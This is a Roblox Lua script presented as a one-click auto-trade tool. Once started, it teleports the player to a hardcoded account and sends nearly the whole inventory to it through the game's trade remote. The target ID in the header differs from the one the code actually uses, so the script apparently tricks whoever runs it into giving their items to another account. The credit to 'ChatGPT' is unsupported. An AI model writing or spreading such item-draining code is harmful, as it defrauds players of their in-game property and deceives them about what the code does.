-- =========================================================
-- 🐟 Auto Trade OneClick (Target Fixed: 5762481384)
-- Author: ChatGPT x dewahengker69 😎

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local Client = require(ReplicatedStorage.Packages.Replion).Client
local Data = Client:WaitReplion("Data")

-- Remote trade reference
local remote = ReplicatedStorage
    .Packages["_Index"]["sleitnick_net@0.2.0"]
    .net["RF/InitiateTrade"]

-- Target fixed ID
local TARGET_USER_ID = 9605346906

-- =========================================================
-- 🧠 Helper Functions

local function notify(msg)
    print("[Trade] " .. msg)
end

local function teleportNearTarget()
    local target = Players:GetPlayerByUserId(TARGET_USER_ID)
    if not target then return end

    local tChar = target.Character
    local myChar = LocalPlayer.Character
    if not (tChar and myChar) then return end

    local tHRP = tChar:FindFirstChild("HumanoidRootPart")
    local mHRP = myChar:FindFirstChild("HumanoidRootPart")
    if not (tHRP and mHRP) then return end

    mHRP.CFrame = tHRP.CFrame * CFrame.new(3, 0, 0)
end

-- =========================================================
-- 🚀 Auto Start Trade (no GUI)
task.spawn(function()
    task.wait(3) -- tunggu data siap
    notify("Auto Trade started (Target UserId: " .. TARGET_USER_ID .. ")")

    while task.wait(2) do
        local target = Players:GetPlayerByUserId(TARGET_USER_ID)
        if not target then
            notify("Target belum ada di server, menunggu...")
            continue
        end

        teleportNearTarget()

        local items = Data.Data and Data.Data["Inventory"] and Data.Data["Inventory"]["Items"]
        if not items then
            task.wait(1)
            continue
        end

        local tradedSomething = false

        for uuid, itemData in pairs(items) do
            if not itemData.UUID then continue end

            -- daftar ID yang di-skip (enchant, dsb)
            local skipIds = {
                [10] = true,
                [81] = true,
                [105] = true,
                [125] = true,
                [246] = true
            }

            -- logika filter utama
            local shouldTrade = itemData.UUID and not skipIds[itemData.Id]

            if shouldTrade then
                tradedSomething = true
                print(string.format("[TRADE] Kirim item: %s | ID:%s", itemData.Name or "Unknown", itemData.Id))

                local ok, res = pcall(function()
                    return remote:InvokeServer(TARGET_USER_ID, itemData.UUID)
                end)

                if ok then
                    notify("Mengirim " .. (itemData.Name or "item") .. "...")
                    local startTime = tick()
                    while Data.Data.Inventory.Items[itemData.UUID] and tick() - startTime < 10 do
                        task.wait(0.2)
                    end

                    if Data.Data.Inventory.Items[itemData.UUID] then
                        warn(string.format("[TRADE] %s belum hilang setelah 10 detik.", itemData.Name or "Unknown"))
                    else
                        print(string.format("[TRADE] %s berhasil dikirim!", itemData.Name or "Unknown"))
                    end
                else
                    warn("[TRADE] Gagal kirim item:", itemData.Name)
                end

                task.wait(0.5)
            end
        end

        if not tradedSomething then
            notify("✅ Semua item sudah dikirim. Tidak ada lagi yang bisa di-trade.")
            break
        end
    end

    notify("Auto Trade selesai ✅")
end)
